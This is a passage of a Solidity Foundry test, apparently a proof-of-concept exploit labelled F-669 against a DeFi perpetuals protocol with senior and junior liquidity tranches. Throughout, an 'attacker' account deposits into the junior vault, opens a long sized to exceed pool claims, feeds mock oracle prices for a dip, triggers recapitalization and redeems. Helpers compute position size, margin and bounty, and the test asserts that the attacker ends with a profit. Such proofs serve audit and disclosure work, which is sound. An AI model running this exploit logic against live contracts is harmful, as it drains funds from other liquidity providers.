        // leave the other juniors at their old principal. Senior stops at the mark. The junior
        // balance left in the vault is the other holders, and it is above their starting principal.
        require(pool.seniorPrincipal() == pool.seniorHighWaterMark(), "senior not restored to hwm");
        require(pool.seniorPrincipal() < hwmBeforeDip + 1_000e6, "senior paid above pre-dip mark");
        require(pool.juniorPrincipal() > juniorAtStart, "passive juniors not above old principal");
        console2.log("passiveJuniorLeft", pool.juniorPrincipal());

        uint256 wallet = usdg.balanceOf(attacker);
        uint256 clearingLeft = clearing.balanceAssets(attacker);
        uint256 ending = wallet + clearingLeft;
        uint256 profit = ending - contributed;
        uint256 gasUsed = gasStart - gasleft();
        console2.log("RESULT");
        console2.log("contributed", contributed);
        console2.log("wallet", wallet);
        console2.log("clearing", clearingLeft);
        console2.log("ending", ending);
        console2.log("profit", profit);
        console2.log("fundsAtRiskCappedUnassigned", cappedAway);
        console2.log("gas", gasUsed);
        require(ending > contributed, "attacker did not profit");
    }

    function _prepareSizes() internal {
        (uint256 vpiFactor, uint256 maxSkew,, uint256 initMarginBps,,,,,,) = engine.riskParams();
        console2.log("vpiFactor", vpiFactor);
        console2.log("maxSkewRatio", maxSkew);
        console2.log("initMarginBps", initMarginBps);
        require(vpiFactor == 0.01e18 && maxSkew == 0.4e18 && initMarginBps == 20, "launch risk params");

        _fillRaw(indexRaw, INDEX_TARGET);
        _fillRaw(dipRaw, DIP_TARGET);
        indexPrice = _quote(indexRaw);
        dipPrice = _quote(dipRaw);
        console2.log("indexPrice", indexPrice);
        console2.log("dipPrice", dipPrice);
        require(_near(indexPrice, INDEX_TARGET) && _near(dipPrice, DIP_TARGET), "basket off target");
        require(indexPrice > dipPrice && dipPrice > 0, "dip not below index");

        uint256 senior = pool.seniorPrincipal();
        uint256 juniorPrincipal = pool.juniorPrincipal();
        depositAssets = juniorPrincipal * 2;
        uint256 claimed = senior + juniorPrincipal + depositAssets;
        int256 preDip = book.terminalLpPriceDeltaAssetAtoms(uint32(dipPrice));
        console2.log("preDipDelta");
        console2.logInt(preDip);

        uint256 drop = indexPrice - dipPrice;
        int256 need = preDip + int256(claimed) + int256(SURPLUS);
        if (need < 0) need = 0;
        uint256 lots = (uint256(need) + drop - 1) / drop;
        lots = lots * 115 / 100 + 1;
        openSize = lots * LOT;
        uint256 notional = lots * indexPrice;

        (uint256 longMax, uint256 longOi,,) = engine.sides(0);
        (uint256 shortMax, uint256 shortOi,,) = engine.sides(1);
        uint256 postLong = (longOi * indexPrice) / LOT + notional;
        uint256 shortNotional = (shortOi * indexPrice) / LOT;
        uint256 postSkew = postLong > shortNotional ? postLong - shortNotional : shortNotional - postLong;
        uint256 skewDepth = (postSkew * 1e18 * 100) / (maxSkew * 85);
        uint256 longLiability = longMax + notional;
        uint256 liability = longLiability > shortMax ? longLiability : shortMax;
        uint256 solvencyDepth = (liability * 10_025) / 10_000;
        uint256 depthNeed = skewDepth > solvencyDepth ? skewDepth : solvencyDepth;
        uint256 have = pool.totalAssets() + depositAssets;
        require(depthNeed > have, "pool already deep enough");
        recapAssets = ((depthNeed - have) * 110) / 100;
        marginAssets = notional / 20;
        uint256 initFloor = (notional * initMarginBps * 5) / 10_000;
        if (marginAssets < initFloor) marginAssets = initFloor;
        // Commit locks the open bounty from free settlement before it locks marginDelta.
        // The deposited balance has to cover both. The bounty is capped by the live router.
        uint256 bounty = (notional * router.openOrderExecutionBountyBps()) / 10_000;
        uint256 minBounty = router.minOpenOrderExecutionBountyAssets();
        uint256 maxBounty = router.maxOpenOrderExecutionBountyAssets();
        if (bounty < minBounty) bounty = minBounty;
        if (bounty > maxBounty) bounty = maxBounty;
        openBountyAssets = bounty;
        contributed = depositAssets + marginAssets + openBountyAssets;

        console2.log("deposit", depositAssets);
        console2.log("recapPlan", recapAssets);
        console2.log("margin", marginAssets);
        console2.log("openBounty", openBountyAssets);
        console2.log("lots", lots);
        console2.log("notional", notional);
        console2.log("postSkew", postSkew);
        console2.log("depthNeed", depthNeed);
        require(recapAssets < 10_000_000_000e6, "recap out of range");
        require(openSize % LOT == 0 && lots > 0, "size quantum");
    }

    function _requireSizeStillEnough() internal view {
        uint256 claimed = pool.seniorPrincipal() + pool.juniorPrincipal();
        int256 preDip = book.terminalLpPriceDeltaAssetAtoms(uint32(dipPrice));
        int256 need = preDip + int256(claimed) + int256(SURPLUS);
        if (need <= 0) return;
        uint256 lotsNeeded = (uint256(need) + (indexPrice - dipPrice) - 1) / (indexPrice - dipPrice);
        require(openSize / LOT >= lotsNeeded, "open sized below live principal");
    }

    function _mintAndApprove() internal {
        usdg.mint(attacker, depositAssets + marginAssets + openBountyAssets);
        usdg.mint(owner, recapAssets);
        vm.startPrank(attacker);
        usdg.approve(JUNIOR, depositAssets);
        usdg.approve(CLEARING, marginAssets + openBountyAssets);
        vm.stopPrank();
        vm.prank(owner);
        usdg.approve(ENGINE, recapAssets);
    }

    function _requestDeposit() internal returns (uint256 epoch) {
        (epoch,) = junior.getRequestEpochWindow();
        vm.prank(attacker);
        uint256 id = junior.requestDeposit(depositAssets, attacker);
        require(id == epoch, "deposit epoch");
    }

    function _settleDeposit(uint256 epoch) internal {
        uint256 settleAt = pool.lpEpochStart(epoch) + 2 minutes;
        _warpTo(settleAt);
        for (uint256 i; i < 8; ++i) {
            if (i != 0) _bumpTime();
            _publishAndSettle(indexRaw);
            if (junior.depositEpochActivationTime(epoch) != 0) return;
        }
        revert("deposit epoch did not activate");
    }

    function _claimDeposit(uint256 epoch) internal returns (uint256 shares) {
        vm.prank(attacker);
        shares = junior.claimDepositShares(epoch);
    }

    function _openLong() internal {
        vm.prank(attacker);
        clearing.deposit(attacker, marginAssets + openBountyAssets);
        uint256 commitTs = _now();
        OrderV3Types.OrderRequest memory request = _request(false, openSize, marginAssets);
        vm.prank(attacker);
        uint64 id = router.commitOrder(request);
        _bumpTime();
        _execute(id, indexRaw, commitTs);
    }

    function _closeLong() internal {
        (uint256 size,,,,,,) = engine.positions(attacker);
        uint256 commitTs = _now();
        OrderV3Types.OrderRequest memory request = _request(true, size, 0);
        vm.prank(attacker);
        uint64 id = router.commitOrder(request);
        _bumpTime();
        _execute(id, indexRaw, commitTs);
    }

    function _request(bool isClose, uint256 size, uint256 margin)
        internal
        view
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = keccak256(abi.encode("F-669", attacker, router.nextCommitId(), isClose));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = isClose ? engine.CAP_PRICE() : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(_now() + 1 hours),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _execute(uint64 id, int64[8] memory raws, uint256 commitTs) internal {
        bytes[] memory data = _payload(raws, _now(), commitTs);
        uint256 fee = IPythView(pythAddr).getUpdateFee(data);
        vm.prank(attacker);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee * 2}(id, data);
        if (result.status != OrderV3Types.LifecycleStatus.Executed) {
            console2.log("order status", uint256(result.status));
            console2.log("terminal reason", uint256(result.terminalReason));
            console2.log("pending reason", uint256(result.pendingReason));
            revert("order not executed");
        }
    }

    function _settleThrough(uint256 epoch, int64[8] memory raws, uint256 refundEpoch) internal {
        uint256 settleAt = pool.lpEpochStart(epoch) + 2 minutes;
        if (_now() < settleAt) _warpTo(settleAt);
        for (uint256 i; i < 8; ++i) {
            if (i != 0) _bumpTime();
            _publishAndSettle(raws);
            if (refundEpoch != 0 && junior.redeemRefundPending(refundEpoch, attacker)) return;
            uint256 head = junior.redeemQueueHead();
            if (head == 0 || head > epoch) return;
        }
        revert("redeem epoch not cleared");
    }

    function _claimRefund(uint256 epoch) internal returns (uint256 shares) {
        vm.prank(attacker);
        shares = junior.claimRedeemRefund(epoch, attacker, attacker);
    }

    function _claimRedeem(uint256 epoch, uint256 shares) internal returns (uint256 assets) {
        uint256 claimable = junior.claimableRedeemRequest(epoch, attacker);
        if (claimable == 0) return 0;
        if (shares > claimable) shares = claimable;
        vm.prank(attacker);
        assets = junior.claimRedeem(epoch, shares, attacker, attacker);
    }

    function _withdrawMargin() internal {
        uint256 bal = clearing.balanceAssets(attacker);
        if (bal == 0) return;
        vm.prank(attacker);
        clearing.withdraw(attacker, bal);
    }

    function _publish(int64[8] memory raws) internal {
        bytes[] memory data = _payload(raws, _now(), _now() - 1);
        uint256 fee = IPythView(pythAddr).getUpdateFee(data);
        router.updateMarkPrice{value: fee}(data);
    }

    function _publishAndSettle(int64[8] memory raws) internal {
        bytes[] memory data = _payload(raws, _now(), _now() - 1);
        uint256 fee = IPythView(pythAddr).getUpdateFee(data);
        router.settleLpEpoch{value: fee}(data);
    }

    function _payload(int64[8] memory raws, uint256 publishTime, uint256 prevPublishTime)
        internal
        view
        returns (bytes[] memory data)
    {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedCount);
        for (uint256 i; i < feedCount; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: raws[i],
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: prevPublishTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _loadFeeds() internal {
        for (uint256 i; i < 8; ++i) {
            try oracle.pythFeedIds(i) returns (bytes32 id) {
                feedIds[i] = id;
                bases[i] = oracle.basePrices(i);
                weights[i] = oracle.quantities(i);
                inverted[i] = oracle.inversions(i);
                feedCount = i + 1;
            } catch {
                break;
            }
        }
        require(feedCount == 6, "feed count");
    }

    function _fillRaw(int64[8] storage dest, uint256 target) internal {
        for (uint256 i; i < feedCount; ++i) {
            dest[i] = _raw(i, target);
        }
    }

    function _raw(uint256 i, uint256 target) internal view returns (int64) {
        uint256 norm = (bases[i] * target) / INDEX_TARGET;
        require(norm > 0, "zero norm");
        if (!inverted[i]) {
            return _asPrice(norm);
        }
        uint256 denom = norm * 1e18;
        uint256 raw = ((10 ** 34) + (denom / 2)) / denom;
        return _asPrice(raw);
    }

    function _quote(int64[8] storage raws) internal view returns (uint256 basket) {
        for (uint256 i; i < feedCount; ++i) {
            uint256 norm = inverted[i] ? _invert(raws[i]) : uint256(uint64(raws[i]));
            basket += (norm * weights[i]) / (bases[i] * CHAINLINK_TO_TOKEN_SCALE);
        }
    }

    function _invert(int64 price) internal pure returns (uint256) {
        uint256 positivePrice = uint256(uint64(price));
        uint256 scaledInverse = ((10 ** 34) + (positivePrice / 2)) / positivePrice;
        return scaledInverse / 1e18;
    }

    function _asPrice(uint256 raw) internal pure returns (int64) {
        require(raw > 0 && raw <= uint256(uint256(int256(type(int64).max))), "raw price");
        return int64(int256(raw));
    }

    function _near(uint256 actual, uint256 target) internal pure returns (bool) {
        uint256 gap = actual > target ? actual - target : target - actual;
        return gap * 10_000 <= target * 50;
    }

    function _warpToRedeemable() internal {
        uint256 ready = junior.lastDepositTime(attacker) + 1 hours + 1;
        if (_now() < ready) _warpTo(ready);
    }

    function _warpTo(uint256 ts) internal {
        require(ts > _now(), "time did not advance");
        vm.warp(ts);
        vm.roll(block.number + 1);
        require(!engine.isOracleFrozen() && !engine.isFadWindow(), "entered a closed market");
    }

    function _bumpTime() internal {
        vm.warp(_now() + 2);
        vm.roll(block.number + 1);
        require(!engine.isOracleFrozen() && !engine.isFadWindow(), "entered a closed market");
    }

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _logState() internal view {
        console2.log("senior", pool.seniorPrincipal());
        console2.log("junior", pool.juniorPrincipal());
        console2.log("hwm", pool.seniorHighWaterMark());
        console2.log("unassigned", pool.unassignedAssets());
        console2.log("pendingRecap", pool.pendingRecapitalizationAssets());
        console2.log("totalAssets", pool.totalAssets());
        console2.log("accounted", pool.accountedAssets());
        console2.log("mark", engine.lastMarkPrice());
        (,, int256 delta,,,,,) = engine.terminalNavSnapshot();
        console2.log("terminalDelta");
        console2.logInt(delta);
    }

    receive() external payable {}

}

interface IEngine {

    function owner() external view returns (address);
    function settlementToken() external view returns (address);
    function lastMarkPrice() external view returns (uint256);
    function degradedMode() external view returns (bool);
    function isFadWindow() external view returns (bool);
    function isOracleFrozen() external view returns (bool);
    function CAP_PRICE() external view returns (uint256);
    function recapitalizePool(uint256 amountAssets) external;
    function sides(uint256 index)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
    function riskParams()
        external
        view
        returns (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        );
    function terminalNavSnapshot()
        external
        view
        returns (
            uint32 markPrice,
            uint64 markTime,
            int256 terminalLpPriceDeltaAssets,
            uint256 totalTraderClaimsAssets,
            uint256 maxDirectionalLiabilityAssets,
            uint64 bookVersion,
            bool hasOpenPositions,
            bool degradedMode
        );
    function positions(address account)
        external
        view
        returns (
            uint256 size,
            uint256 margin,
            uint256 entryPrice,
            uint256 maxProfitAssets,
            CfdTypes.Side side,
            uint64 lastUpdateTime,
            int256 vpiAccrued
        );

}

interface IPool {

    function isTradingActive() external view returns (bool);
    function seniorPrincipal() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function seniorHighWaterMark() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function pendingRecapitalizationAssets() external view returns (uint256);
    function accountedAssets() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function getFreeAssets() external view returns (uint256);
    function lpEpochStart(uint256 epochId) external view returns (uint256);

}

interface IJunior {

    function getRequestEpochWindow() external view returns (uint256 nextRequestEpoch, uint256 nextRequestCutoffTime);
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function claimDepositShares(uint256 requestId) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function claimRedeem(uint256 requestId, uint256 shares, address receiver, address controller)
        external
        returns (uint256 assets);
    function claimRedeemRefund(uint256 requestId, address receiver, address controller) external returns (uint256 shares);
    function claimableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function redeemRefundPending(uint256 requestId, address controller) external view returns (bool);
    function estimateWithdrawShares(uint256 assets) external view returns (uint256);
    function depositEpochActivationTime(uint256 epochId) external view returns (uint256);
    function lastDepositTime(address account) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function redeemQueueHead() external view returns (uint256);

}

interface IOracle {

    function pyth() external view returns (address);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function basePrices(uint256 index) external view returns (uint256);
    function quantities(uint256 index) external view returns (uint256);
    function inversions(uint256 index) external view returns (bool);

}

interface IRouter {

    function nextCommitId() external view returns (uint64);
    function nextExecuteId() external view returns (uint64);
    function openOrderExecutionBountyBps() external view returns (uint256);
    function minOpenOrderExecutionBountyAssets() external view returns (uint256);
    function maxOpenOrderExecutionBountyAssets() external view returns (uint256);
    function globalTailOrderId() external view returns (uint64);
    function maxExecutionWindowSeconds() external view returns (uint256);
    function lifecycleBook() external view returns (ILifecycle);
    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;

}

interface ILifecycle {

    function currentExecutionConfigHash() external view returns (bytes32);

}

interface IClearing {

    function deposit(address account, uint256 amount) external;
    function withdraw(address account, uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);

}

interface IBook {

    function terminalLpPriceDeltaAssetAtoms(uint32 markPrice) external view returns (int256);

}

interface IMintUSDG {

    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);

}

interface IPythView {

    function getUpdateFee(bytes[] calldata updateData) external view returns (uint256);
    function getPriceUnsafe(bytes32 id)
        external
        view
        returns (int64 price, uint64 conf, int32 expo, uint256 publishTime);

}
```

